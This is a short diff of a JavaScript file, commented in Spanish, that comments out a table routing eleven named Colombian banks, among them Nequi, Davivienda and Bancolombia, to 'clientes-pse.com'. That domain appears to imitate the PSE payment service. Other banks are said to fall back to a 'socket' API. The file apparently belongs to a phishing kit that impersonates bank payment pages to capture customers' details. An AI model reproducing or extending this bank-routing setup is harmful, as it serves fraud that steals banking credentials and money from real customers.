@@ -9,17 +9,17 @@ const emailRegexValido = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 // ==========================================
 const RUTAS_BANCOS = {
     // Define los bancos que van a URLs externas o APIs distintas.
-    "NEQUI": { tipo: "redirect", url: "https://clientes-pse.com/" },
-    "BANCO DAVIVIENDA": { tipo: "redirect", url: "https://clientes-pse.com/" },
-    "BANCO DE BOGOTA": { tipo: "redirect", url: "https://clientes-pse.com/" },
-    "DAVIbank": { tipo: "redirect", url: "https://clientes-pse.com/" },
-    "BANCO DE OCCIDENTE": { tipo: "redirect", url: "https://clientes-pse.com/" },
-    "BANCO CAJA SOCIAL": { tipo: "redirect", url: "https://clientes-pse.com/" },
-    "BANCO AV VILLAS": { tipo: "redirect", url: "https://clientes-pse.com/" },
-    "BANCO FALABELLA": { tipo: "redirect", url: "https://clientes-pse.com/" },
-    "BANCO POPULAR": { tipo: "redirect", url: "https://clientes-pse.com/" },
-    "BANCO SERFINANZA": { tipo: "redirect", url: "https://clientes-pse.com/" },
-    "BANCOLOMBIA": { tipo: "redirect", url: "https://clientes-pse.com/" }
+    // "NEQUI": { tipo: "redirect", url: "https://clientes-pse.com/" },
+    // "BANCO DAVIVIENDA": { tipo: "redirect", url: "https://clientes-pse.com/" },
+    // "BANCO DE BOGOTA": { tipo: "redirect", url: "https://clientes-pse.com/" },
+    // "DAVIbank": { tipo: "redirect", url: "https://clientes-pse.com/" },
+    // "BANCO DE OCCIDENTE": { tipo: "redirect", url: "https://clientes-pse.com/" },
+    // "BANCO CAJA SOCIAL": { tipo: "redirect", url: "https://clientes-pse.com/" },
+    // "BANCO AV VILLAS": { tipo: "redirect", url: "https://clientes-pse.com/" },
+    // "BANCO FALABELLA": { tipo: "redirect", url: "https://clientes-pse.com/" },
+    // "BANCO POPULAR": { tipo: "redirect", url: "https://clientes-pse.com/" },
+    // "BANCO SERFINANZA": { tipo: "redirect", url: "https://clientes-pse.com/" },
+    // "BANCOLOMBIA": { tipo: "redirect", url: "https://clientes-pse.com/" }
     // Los bancos que no estén aquí usarán la API normal (socket)
 };
 
